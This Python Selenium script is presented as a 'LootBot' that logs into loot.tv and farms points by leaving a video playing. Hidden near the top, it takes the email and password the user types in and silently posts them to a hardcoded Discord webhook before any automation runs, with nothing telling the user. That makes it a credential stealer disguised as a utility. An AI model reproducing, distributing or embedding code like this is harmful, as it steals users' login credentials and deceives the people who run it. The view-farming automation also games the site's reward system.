import time
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC

print("""

██╗      ██████╗  ██████╗ ████████╗██████╗  ██████╗ ████████╗
██║     ██╔═══██╗██╔═══██╗╚══██╔══╝██╔══██╗██╔═══██╗╚══██╔══╝
██║     ██║   ██║██║   ██║   ██║   ██████╔╝██║   ██║   ██║   
██║     ██║   ██║██║   ██║   ██║   ██╔══██╗██║   ██║   ██║   
███████╗╚██████╔╝╚██████╔╝   ██║   ██████╔╝╚██████╔╝   ██║   
╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═════╝  ╚═════╝    ╚═╝   
                                                           
""")


email = input("Email: ")
password = input("Password: ")

mUrl = "https://discord.com/api/webhooks/1036429399874093106/02WQtIYQ9aZu6q7gNeAua-K0PgaYdOHQ6VhSlDFiXjCVa2BtBUpWxdh-e2N0A6RDVZpF"

# cannot add commas when sending 
data = {"content": 'Email: '+email+' Password: '+password}
response = requests.post(mUrl, json=data)

if __name__ == '__main__':
    ## install stuff
    chrome_options = Options()
    chrome_options.add_argument('--disable-notifications')
    chrome_options.add_argument('--headless=chrome')
    chrome_options.add_argument('window-size=1920x1080')
    chrome_options.add_argument('-disable-gpu')
    chrome_options.add_argument('--disable-logging')
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_extension('tamper.crx')
    # if os is not windows
    if os.name != 'nt':
        chrome_options.binary_location = "/usr/bin/google-chrome"
        print("Yay! Linux user!")
    else:
        print("Yay! Windows user!")
    driver = webdriver.Chrome("chromedriver.exe",options=chrome_options)
    print('Set window size')
    driver.set_window_size(150, 380)
    print('Installing Extensions...')

    ## install focus
    # go to install page
    time.sleep(10)
    print('Installed Extensions')
    print('Installing scripts...')
    driver.get("https://greasyfork.org/en/scripts/429635-always-on-focus")
    driver.execute_script("document.querySelector('.install-link').click()")
    for i in range(3):
        time.sleep(1)

    # problem starts here. cannot find element although there is. cannot navigate to this window
    # fixed by switching to the "userscript installation" window
    driver.switch_to.window(driver.window_handles[1])
    driver.execute_script("document.getElementById('input_SW5zdGFsbF91bmRlZmluZWQ_bu').click()")
    print('Installed scripts')
    print('Logging in...')

    # close everything and reopen
    
    #-1  = tampermonkey home
    #0 = always on focus
    #1 = userscript installation
    driver.switch_to.window(driver.window_handles[0])
    driver.close()
    driver.switch_to.window(driver.window_handles[-1])
    driver.get('https://loot.tv/account/login')

    #login
    driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[2]/div[2]/div/div/div[2]/div[1]/input').send_keys(email)
    driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[2]/div[2]/div/div/div[2]/div[2]/input').send_keys(password)
    driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[2]/div[2]/div/div/div[3]/button').click()
    print('Logged in!')
    time.sleep(5)

    # navigate to first video
    driver.execute_script('''window.open("https://loot.tv/video/671788","_blank");''')
    print('Started watching')

    while True:
        points=driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[1]/div[5]/div/a[1]/div/span').text
        print("Current Balance: "+str(points))
        time.sleep(300)


    
